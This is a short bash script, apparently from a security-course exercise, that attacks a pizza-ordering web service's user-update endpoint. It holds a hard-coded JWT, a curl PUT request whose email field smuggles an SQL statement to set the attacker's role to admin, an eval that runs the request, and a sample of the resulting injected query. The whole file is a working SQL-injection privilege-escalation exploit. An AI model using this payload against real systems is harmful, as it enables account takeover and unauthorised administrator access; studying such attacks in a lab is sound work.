
myUserId=533
myEmail=hacker@jwt.com
myPassword=haha
myToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSWhhY2siLCJlbWFpbCI6ImhhY2tlckBqd3QuY29tIiwicm9sZXMiOlt7InJvbGUiOiJkaW5lciJ9XSwiaWQiOjUzMywiaWF0IjoxNzQ0NzQ5NzMxfQ.aOWz-4x1yykr1OzlO2wxO2F-AWezqb7WJGnqn6_DIDc

targetBaseUrl=http://localhost:3000 #https://pizza-service.pizzajwt.click

targetRole='admin'


sqlAttackStatement="UPDATE userRole SET role = '\''$targetRole" #"INSERT INTO userRole (userId, role, objectId) VALUES ($myUserId, '$targetRole', 0)"




curlCommand="curl -X PUT \"$targetBaseUrl/api/auth/$myUserId\" \
    -H \"Content-Type: application/json\" \
    -H \"Authorization: Bearer $myToken\" \
    -d '{\"email\": \"$myEmail'\'' WHERE id=$myUserId; $sqlAttackStatement\", \"password\":\"$myPassword\"}'"

# Print the curl command
echo "$curlCommand"

# Execute the curl command
eval "$curlCommand"

# sample output query "UPDATE user SET password='$2b$10$BGs6wvzlooxEaMIiAFDc8euxsGLv3fGWAeIsOgZNklOG810MgMrfu', email='hacker@jwt.com' WHERE id=533; UPDATE userRole SET role = 'admin' WHERE id=533"